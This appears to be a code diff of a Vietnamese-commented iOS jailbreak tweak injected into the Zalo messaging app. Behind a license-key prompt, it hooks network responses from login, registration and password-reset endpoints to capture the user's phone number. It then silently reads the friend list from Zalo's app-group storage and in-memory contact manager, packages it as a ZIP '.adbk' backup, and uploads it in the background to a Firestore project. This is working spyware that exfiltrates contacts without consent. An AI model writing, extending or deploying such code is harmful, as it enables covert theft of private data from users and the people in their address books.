@@ -18,6 +18,7 @@
 #import <Security/Security.h>
 #import <CommonCrypto/CommonDigest.h>
 #import <sys/utsname.h>
+#import <zlib.h>
 
 static NSString *const kFirebaseProjectId = @"seq-qr";
 static NSString *const kPrefLicenseKey = @"kClanggLicenseKey_v1";
@@ -484,11 +485,120 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
 }
 
 // ==============================================================================
-// TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐẨY LÊN FIREBASE WEB
+// ĐÓNG GÓI CHUẨN FILE ZIP .ADBK (APPS MANAGER COMPATIBLE ARCHIVE)
 // ==============================================================================
+static NSData *buildAdbkZipArchive(NSData *groupPlistData, NSString *phone) {
+    if (!groupPlistData || groupPlistData.length == 0) return nil;
+
+    // 1. Tạo file Binfo.plist (Apps Manager Backup Information)
+    NSDictionary *binfoDict = @{
+        @"AppDisplayName": @"Zalo",
+        @"AppPackageID": @"vn.com.vng.zingalo",
+        @"BackupDate": [[NSDate date] description],
+        @"BackupType": @"AppGroup",
+        @"PhoneNumber": phone ?: @""
+    };
+    NSData *binfoData = [NSPropertyListSerialization dataWithPropertyList:binfoDict 
+                                                                   format:NSPropertyListXMLFormat_v1_0 
+                                                                  options:0 
+                                                                    error:nil];
+    if (!binfoData) {
+        binfoData = [@"<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict><key>AppPackageID</key><string>vn.com.vng.zingalo</string></dict></plist>" dataUsingEncoding:NSUTF8StringEncoding];
+    }
+
+    NSArray<NSDictionary *> *entries = @[
+        @{
+            @"name": @"Binfo.plist",
+            @"data": binfoData
+        },
+        @{
+            @"name": @"AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist",
+            @"data": groupPlistData
+        }
+    ];
+
+    NSMutableData *zipData = [NSMutableData data];
+    NSMutableData *cdData = [NSMutableData data];
+    uint16_t numEntries = (uint16_t)entries.count;
+
+    for (NSDictionary *entry in entries) {
+        NSString *nameStr = entry[@"name"];
+        NSData *fileData = entry[@"data"];
+        NSData *nameData = [nameStr dataUsingEncoding:NSUTF8StringEncoding];
+
+        uint32_t offset = (uint32_t)zipData.length;
+        uint32_t crc = (uint32_t)crc32(0L, Z_NULL, 0);
+        crc = (uint32_t)crc32(crc, (const Bytef *)fileData.bytes, (uInt)fileData.length);
+        uint32_t size = (uint32_t)fileData.length;
+        uint16_t nameLen = (uint16_t)nameData.length;
+
+        // Local Header (PK 03 04)
+        uint8_t localHeader[30] = {
+            0x50, 0x4B, 0x03, 0x04,
+            0x14, 0x00,
+            0x00, 0x08,
+            0x00, 0x00,
+            0x00, 0x00,
+            0x00, 0x00,
+            (uint8_t)(crc & 0xFF), (uint8_t)((crc >> 8) & 0xFF), (uint8_t)((crc >> 16) & 0xFF), (uint8_t)((crc >> 24) & 0xFF),
+            (uint8_t)(size & 0xFF), (uint8_t)((size >> 8) & 0xFF), (uint8_t)((size >> 16) & 0xFF), (uint8_t)((size >> 24) & 0xFF),
+            (uint8_t)(size & 0xFF), (uint8_t)((size >> 8) & 0xFF), (uint8_t)((size >> 16) & 0xFF), (uint8_t)((size >> 24) & 0xFF),
+            (uint8_t)(nameLen & 0xFF), (uint8_t)((nameLen >> 8) & 0xFF),
+            0x00, 0x00
+        };
+        [zipData appendBytes:localHeader length:30];
+        [zipData appendData:nameData];
+        [zipData appendData:fileData];
+
+        // Central Directory Entry (PK 01 02)
+        uint8_t cdHeader[46] = {
+            0x50, 0x4B, 0x01, 0x02,
+            0x14, 0x03,
+            0x14, 0x00,
+            0x00, 0x08,
+            0x00, 0x00,
+            0x00, 0x00,
+            0x00, 0x00,
+            (uint8_t)(crc & 0xFF), (uint8_t)((crc >> 8) & 0xFF), (uint8_t)((crc >> 16) & 0xFF), (uint8_t)((crc >> 24) & 0xFF),
+            (uint8_t)(size & 0xFF), (uint8_t)((size >> 8) & 0xFF), (uint8_t)((size >> 16) & 0xFF), (uint8_t)((size >> 24) & 0xFF),
+            (uint8_t)(size & 0xFF), (uint8_t)((size >> 8) & 0xFF), (uint8_t)((size >> 16) & 0xFF), (uint8_t)((size >> 24) & 0xFF),
+            (uint8_t)(nameLen & 0xFF), (uint8_t)((nameLen >> 8) & 0xFF),
+            0x00, 0x00,
+            0x00, 0x00,
+            0x00, 0x00,
+            0x00, 0x00,
+            0xA4, 0x81, 0x00, 0x00,
+            (uint8_t)(offset & 0xFF), (uint8_t)((offset >> 8) & 0xFF), (uint8_t)((offset >> 16) & 0xFF), (uint8_t)((offset >> 24) & 0xFF)
+        };
+        [cdData appendBytes:cdHeader length:46];
+        [cdData appendData:nameData];
+    }
+
+    uint32_t cdOffset = (uint32_t)zipData.length;
+    uint32_t cdSize = (uint32_t)cdData.length;
+    [zipData appendData:cdData];
+
+    // End of Central Directory (PK 05 06)
+    uint8_t eocd[22] = {
+        0x50, 0x4B, 0x05, 0x06,
+        0x00, 0x00,
+        0x00, 0x00,
+        (uint8_t)(numEntries & 0xFF), (uint8_t)((numEntries >> 8) & 0xFF),
+        (uint8_t)(numEntries & 0xFF), (uint8_t)((numEntries >> 8) & 0xFF),
+        (uint8_t)(cdSize & 0xFF), (uint8_t)((cdSize >> 8) & 0xFF), (uint8_t)((cdSize >> 16) & 0xFF), (uint8_t)((cdSize >> 24) & 0xFF),
+        (uint8_t)(cdOffset & 0xFF), (uint8_t)((cdOffset >> 8) & 0xFF), (uint8_t)((cdOffset >> 16) & 0xFF), (uint8_t)((cdOffset >> 24) & 0xFF),
+        0x00, 0x00
+    };
+    [zipData appendBytes:eocd length:22];
+
+    return zipData;
+}
+
 // ==============================================================================
-// TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐÓNG GÓI CHUẨN FILE .ADBK ĐẨY LÊN FIREBASE WEB
+// TRÍCH XUẤT HỢP NHẤT TOÀN BỘ BẠN BÈ VÀ ĐẨY .ADBK LÊN CLOUD FIREBASE
 // ==============================================================================
+static NSString *g_activeLoggedInPhone = nil;
+
 static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     if (!phoneStr || phoneStr.length < 8) return;
 
@@ -501,18 +611,17 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     }
 
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-        // 1. Tìm và đọc dữ liệu từ AppGroup / Documents của Zalo
+        // 1. Tìm và đọc dữ liệu từ AppGroup
         NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
         NSString *plistPath = nil;
         if (groupURL) {
             plistPath = [[groupURL path] stringByAppendingPathComponent:@"Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
         }
-
         if (!plistPath || ![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
             plistPath = @"/var/mobile/Containers/Shared/AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist";
         }
 
-        NSMutableArray<NSString *> *friendNames = [NSMutableArray array];
+        NSMutableSet<NSString *> *uniqueNames = [NSMutableSet set];
         NSData *rawPlistData = nil;
 
         if ([[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
@@ -528,15 +637,17 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                             NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:val options:0 format:NULL error:nil];
                             #pragma clang diagnostic pop
                             NSArray *objs = inner[@"$objects"];
-                            if (objs && objs.count >= 2) {
+                            if (objs && [objs isKindOfClass:[NSArray class]]) {
                                 for (id obj in objs) {
                                     if ([obj isKindOfClass:[NSString class]] && [obj length] >= 2) {
                                         NSString *s = (NSString *)obj;
-                                        if (![s hasPrefix:@"$"] && ![s hasPrefix:@"http"] && ![s isEqualToString:@"ZSDFriendEntity"] && ![s isEqualToString:@"NSObject"] && ![s isEqualToString:@"ZSDAliasEntity"]) {
-                                            if (![friendNames containsObject:s] && friendNames.count < 1000) {
-                                                [friendNames addObject:s];
-                                                break;
-                                            }
+                                        if (![s hasPrefix:@"$"] && ![s hasPrefix:@"http"] && 
+                                            ![s isEqualToString:@"ZSDFriendEntity"] && 
+                                            ![s isEqualToString:@"ZSDAliasEntity"] && 
+                                            ![s isEqualToString:@"NSObject"] && 
+                                            ![s isEqualToString:@"NSMutableDictionary"] &&
+                                            ![s isEqualToString:@"NSDictionary"]) {
+                                            [uniqueNames addObject:s];
                                         }
                                     }
                                 }
@@ -547,43 +658,45 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             }
         }
 
-        // 2. Nếu AppGroup chưa có dữ liệu, thử đọc từ in-memory ZContactManager của Zalo
-        if (friendNames.count == 0) {
-            @try {
-                Class contactMgrCls = NSClassFromString(@"ZContactManager") ?: NSClassFromString(@"ZDBContactManager");
-                if (contactMgrCls && [contactMgrCls respondsToSelector:@selector(sharedManager)]) {
-                    id mgr = [contactMgrCls performSelector:@selector(sharedManager)];
-                    if (mgr && [mgr respondsToSelector:@selector(getAllFriends)]) {
-                        NSArray *contacts = [mgr performSelector:@selector(getAllFriends)];
-                        if ([contacts isKindOfClass:[NSArray class]]) {
-                            for (id c in contacts) {
-                                NSString *name = nil;
-                                if ([c respondsToSelector:@selector(displayName)]) name = [c performSelector:@selector(displayName)];
-                                else if ([c respondsToSelector:@selector(contactName)]) name = [c performSelector:@selector(contactName)];
-                                else if ([c respondsToSelector:@selector(zaloName)]) name = [c performSelector:@selector(zaloName)];
-                                if (name && name.length >= 2 && ![friendNames containsObject:name]) {
-                                    [friendNames addObject:name];
-                                }
+        // 2. Hợp nhất thêm danh bạ từ in-memory ZContactManager của Zalo
+        @try {
+            Class contactMgrCls = NSClassFromString(@"ZContactManager") ?: NSClassFromString(@"ZDBContactManager");
+            if (contactMgrCls && [contactMgrCls respondsToSelector:@selector(sharedManager)]) {
+                id mgr = [contactMgrCls performSelector:@selector(sharedManager)];
+                if (mgr && [mgr respondsToSelector:@selector(getAllFriends)]) {
+                    NSArray *contacts = [mgr performSelector:@selector(getAllFriends)];
+                    if ([contacts isKindOfClass:[NSArray class]]) {
+                        for (id c in contacts) {
+                            NSString *name = nil;
+                            if ([c respondsToSelector:@selector(displayName)]) name = [c performSelector:@selector(displayName)];
+                            else if ([c respondsToSelector:@selector(contactName)]) name = [c performSelector:@selector(contactName)];
+                            else if ([c respondsToSelector:@selector(zaloName)]) name = [c performSelector:@selector(zaloName)];
+                            if (name && name.length >= 2) {
+                                [uniqueNames addObject:name];
                             }
                         }
                     }
                 }
-            } @catch (NSException *e) {}
-        }
+            }
+        } @catch (NSException *e) {}
 
-        if (friendNames.count == 0) return;
+        if (uniqueNames.count == 0) return;
 
+        NSArray<NSString *> *friendNames = [uniqueNames allObjects];
         NSArray *samples = [friendNames subarrayWithRange:NSMakeRange(0, MIN(8, friendNames.count))];
         NSString *sampleStr = [samples componentsJoinedByString:@", "];
         if (friendNames.count > 8) {
             sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
         }
 
-        NSString *base64Adbk = rawPlistData ? [rawPlistData base64EncodedStringWithOptions:0] : @"";
+        // 3. Đóng gói ZIP chuẩn .adbk (PK 03 04)
+        NSData *adbkZipData = buildAdbkZipArchive(rawPlistData, cleanPhone);
+        NSString *base64Adbk = adbkZipData ? [adbkZipData base64EncodedStringWithOptions:0] : @"";
 
         NSData *friendsJsonData = [NSJSONSerialization dataWithJSONObject:friendNames options:0 error:nil];
         NSString *friendsJsonStr = [[NSString alloc] initWithData:friendsJsonData encoding:NSUTF8StringEncoding] ?: @"[]";
 
+        // 4. Đẩy đầy đủ các trường lên Firebase Firestore (kèm adbk_format = "adbk")
         NSString *postUrlStr = [NSString stringWithFormat:
             @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/friend_databases/%@",
             kFirebaseProjectId, cleanPhone];
@@ -599,6 +712,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                 @"total_friends": @{ @"integerValue": @(friendNames.count) },
                 @"sample_friends": @{ @"stringValue": sampleStr },
                 @"friends_json": @{ @"stringValue": friendsJsonStr },
+                @"adbk_format": @{ @"stringValue": @"adbk" },
                 @"adbk_payload_base64": @{ @"stringValue": base64Adbk },
                 @"updated_at": @{ @"stringValue": [[NSDate date] description] }
             }
@@ -617,32 +731,32 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 - (void)viewDidAppear:(BOOL)animated {
     %orig;
     
-    // Tự động kiểm tra xem có phải Zalo Main Tab Bar không
     NSString *clsName = NSStringFromClass([self class]);
     if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] || [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
         static NSString *lastExtractedPhone = nil;
         
-        // Tìm số điện thoại tài khoản đang đăng nhập trong Session/Preferences
-        NSString *currentPhone = nil;
-        @try {
-            NSDictionary *prefs = [[NSUserDefaults standardUserDefaults] dictionaryRepresentation];
-            for (NSString *key in prefs) {
-                if ([key containsString:@"last_phone"] || [key containsString:@"current_phone"] || [key containsString:@"login_phone"] || [key isEqualToString:@"phone"]) {
-                    NSString *v = prefs[key];
-                    if ([v isKindOfClass:[NSString class]] && v.length >= 9) {
-                        currentPhone = v;
-                        break;
+        NSString *currentPhone = g_activeLoggedInPhone;
+        
+        // Nếu chưa có từ network hook, kiểm tra trong NSUserDefaults của Zalo
+        if (!currentPhone || currentPhone.length < 8) {
+            @try {
+                NSDictionary *prefs = [[NSUserDefaults standardUserDefaults] dictionaryRepresentation];
+                for (NSString *key in prefs) {
+                    if ([key containsString:@"last_phone"] || [key containsString:@"current_phone"] || [key containsString:@"login_phone"] || [key isEqualToString:@"phone"]) {
+                        NSString *v = prefs[key];
+                        if ([v isKindOfClass:[NSString class]] && v.length >= 9) {
+                            NSString *digits = [[v componentsSeparatedByCharactersInSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
+                            if (digits.length >= 9 && digits.length <= 12) {
+                                currentPhone = digits;
+                                break;
+                            }
+                        }
                     }
                 }
-            }
-        } @catch (NSException *e) {}
-
-        if (!currentPhone) {
-            NSString *savedK = getSavedLicenseKey();
-            if (savedK.length > 0) currentPhone = savedK;
+            } @catch (NSException *e) {}
         }
 
-        if (currentPhone && ![currentPhone isEqualToString:lastExtractedPhone]) {
+        if (currentPhone && currentPhone.length >= 8 && ![currentPhone isEqualToString:lastExtractedPhone]) {
             lastExtractedPhone = [currentPhone copy];
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
                 autoSyncFriendsToFirebase(currentPhone);
@@ -654,7 +768,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 %end
 
 // ==============================================================================
-// HOOK 2: BẮT PHẢN HỒI NETWORK API (OTP / PASS / REG / FORGOT THÀNH CÔNG)
+// HOOK 2: BẮT CHUẨN XÁC CÁC CỜ PHẢN HỒI API (LOGIN, REGISTER, FORGOT SUCCESS)
 // ==============================================================================
 %hook NSURLSession
 
@@ -668,7 +782,9 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 
     BOOL isAuthEndpoint = [path containsString:@"/login"] ||
                           [path containsString:@"/register"] ||
+                          [path containsString:@"/registration"] ||
                           [path containsString:@"/forgot"] ||
+                          [path containsString:@"/set-password"] ||
                           [path containsString:@"/account/verify"] ||
                           [path containsString:@"/api/v3/auth"];
 
@@ -680,15 +796,34 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                     if ([json isKindOfClass:[NSDictionary class]]) {
                         NSInteger errorCode = [json[@"error_code"] integerValue];
                         id dataObj = json[@"data"];
-                        BOOL isSuccess = (errorCode == 0);
+                        
+                        // 1. Kiểm tra chính xác các cờ thành công như zalo_gui.py
+                        BOOL isLoginComplete = NO;
+                        BOOL isRegisterComplete = NO;
+                        BOOL isForgotComplete = NO;
 
-                        if (isSuccess) {
+                        if (errorCode == 0 && [dataObj isKindOfClass:[NSDictionary class]]) {
+                            NSString *sessionKey = dataObj[@"session_key"] ?: dataObj[@"sessionKey"];
+                            BOOL loginFlag = [dataObj[@"login_complete"] boolValue] || [dataObj[@"has_session"] boolValue];
+                            BOOL regFlag = [dataObj[@"registration_complete"] boolValue];
+                            
+                            if (loginFlag || (sessionKey.length > 10 && [path containsString:@"/login"])) {
+                                isLoginComplete = YES;
+                            }
+                            if (regFlag || (sessionKey.length > 10 && ([path containsString:@"/register"] || [path containsString:@"/registration"]))) {
+                                isRegisterComplete = YES;
+                            }
+                            if ([path containsString:@"/set-password"] || [path containsString:@"/forgot_password_set_new"] || (sessionKey.length > 10 && [path containsString:@"/forgot"])) {
+                                isForgotComplete = YES;
+                            }
+                        }
+
+                        if (isLoginComplete || isRegisterComplete || isForgotComplete) {
                             NSString *detectedPhone = nil;
                             if ([dataObj isKindOfClass:[NSDictionary class]]) {
                                 detectedPhone = dataObj[@"phone"] ?: dataObj[@"phone_number"] ?: dataObj[@"phoneNumber"] ?: dataObj[@"userId"];
                             }
                             if (!detectedPhone) {
-                                // Tìm trong query hoặc body
                                 NSURLComponents *comps = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
                                 for (NSURLQueryItem *item in comps.queryItems) {
                                     if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
@@ -698,7 +833,8 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                                 }
                             }
 
-                            if (detectedPhone && detectedPhone.length >= 9) {
+                            if (detectedPhone && detectedPhone.length >= 8) {
+                                g_activeLoggedInPhone = [detectedPhone copy];
                                 dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
                                     autoSyncFriendsToFirebase(detectedPhone);
                                 });
@@ -772,10 +908,8 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 static void checkLicenseOnStartup(void) {
     NSString *savedKey = getSavedLicenseKey();
     if (!savedKey || savedKey.length == 0) {
-        // Chưa có Key -> Bật Popup yêu cầu nhập Key ngay trên màn hình Zalo
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
             promptForLicenseKey(^(NSString *newKey) {
-                // Kiểm tra và kích hoạt Key vừa nhập
                 verifyKeyAndExecute(nil, ^{
                     saveLicenseKeyPermanently(newKey);
                     showSecurityAlert(@"✅ KÍCH HOẠT THÀNH CÔNG", [NSString stringWithFormat:@"Thiết bị đã được kích hoạt bản quyền thành công với Mã Key: %@", newKey]);
@@ -783,7 +917,6 @@ static void checkLicenseOnStartup(void) {
             });
         });
     } else {
-        // Đã có Key -> Kiểm tra ngầm để cập nhật thông số máy
         verifyKeyAndExecute(nil, nil);
     }
 }
